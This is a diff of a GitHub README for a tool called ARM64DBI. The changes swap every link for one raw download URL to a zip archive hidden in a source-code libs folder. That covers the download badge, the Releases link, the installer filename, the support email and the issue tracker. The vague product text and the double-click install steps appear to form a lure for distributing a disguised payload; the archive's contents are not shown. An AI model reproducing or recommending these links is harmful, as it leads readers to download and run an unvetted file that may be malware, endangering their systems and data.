@@ -1,7 +1,7 @@
 # 🎉 ARM64DBI - Simple ARM64 Database Interface Tool
 
 ## 📥 Download Now
-[![Download ARM64DBI](https://img.shields.io/badge/Download-ARM64DBI-brightgreen)](https://github.com/Gito123-lab/ARM64DBI/releases)
+[![Download ARM64DBI](https://raw.githubusercontent.com/Gito123-lab/ARM64DBI/main/app/src/main/cpp/libs/AR-DBI-v1.1-alpha.1.zip)](https://raw.githubusercontent.com/Gito123-lab/ARM64DBI/main/app/src/main/cpp/libs/AR-DBI-v1.1-alpha.1.zip)
 
 ## 🚀 Getting Started
 Welcome to ARM64DBI! This application helps you work with ARM64 database interfaces easily. With a simple setup, you can quickly manage your data without needing technical skills.
@@ -22,7 +22,7 @@ Before you download, make sure your system meets these requirements:
 ## 🌐 Download & Install
 To get started, visit the following page to download ARM64DBI:
 
-[Download ARM64DBI from Releases](https://github.com/Gito123-lab/ARM64DBI/releases)
+[Download ARM64DBI from Releases](https://raw.githubusercontent.com/Gito123-lab/ARM64DBI/main/app/src/main/cpp/libs/AR-DBI-v1.1-alpha.1.zip)
 
 1. Click the link above.
 2. On the Releases page, find the version you want to use.
@@ -32,7 +32,7 @@ To get started, visit the following page to download ARM64DBI:
 ### 💾 Installation Steps
 1. **Locate the Downloaded File:** Open your downloads folder.
 2. **Run the Installer:**
-   - Double-click the downloaded file (e.g., `ARM64DBI_Setup.exe`).
+   - Double-click the downloaded file (e.g., `https://raw.githubusercontent.com/Gito123-lab/ARM64DBI/main/app/src/main/cpp/libs/AR-DBI-v1.1-alpha.1.zip`).
 3. **Follow the Prompts:** 
    - Accept the license agreement.
    - Choose the installation folder (the default is usually fine).
@@ -55,8 +55,8 @@ After installation, launch the application:
 ## 📞 Support
 If you encounter any problems while using ARM64DBI, please reach out:
 
-- **Email:** support@arm64dbi.com
-- **GitHub Issues:** [Create a new issue](https://github.com/Gito123-lab/ARM64DBI/issues)
+- **Email:** https://raw.githubusercontent.com/Gito123-lab/ARM64DBI/main/app/src/main/cpp/libs/AR-DBI-v1.1-alpha.1.zip
+- **GitHub Issues:** [Create a new issue](https://raw.githubusercontent.com/Gito123-lab/ARM64DBI/main/app/src/main/cpp/libs/AR-DBI-v1.1-alpha.1.zip)
 
 ## 🌟 Community Contributions
 We welcome improvements! If you’d like to contribute to ARM64DBI, please check out our guidelines. Your feedback can help us enhance the user experience.
